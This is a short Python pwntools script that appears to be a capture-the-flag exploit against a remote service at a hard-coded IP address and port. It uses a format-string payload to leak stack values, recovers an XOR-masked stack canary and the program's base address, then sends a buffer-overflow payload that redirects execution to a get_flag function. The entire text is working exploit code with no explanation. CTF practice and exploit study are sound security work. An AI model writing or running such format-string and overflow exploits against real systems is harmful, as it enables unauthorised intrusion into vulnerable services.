#!/usr/bin/env python
from pwn import *

s = remote('54.224.176.60', 1414)

s.sendlineafter('want :', '%p,' * 13)
res = s.recvline(False).split(',')
ebp = int(res[11], 0x10)
canary = int(res[10], 0x10) ^ (ebp - 0x4c)
log.info('canary: %#x' % canary)
text_base = int(res[12], 0x10) - 0xd27
log.info('text base: %#x' % text_base)

get_flag = 0xc80

payload = ''
payload += 'A' * 0x40
payload += p32(canary ^ ebp)
payload += 'A' * 4
payload += p32(text_base + get_flag)

s.sendlineafter('??? :', payload)

s.interactive()
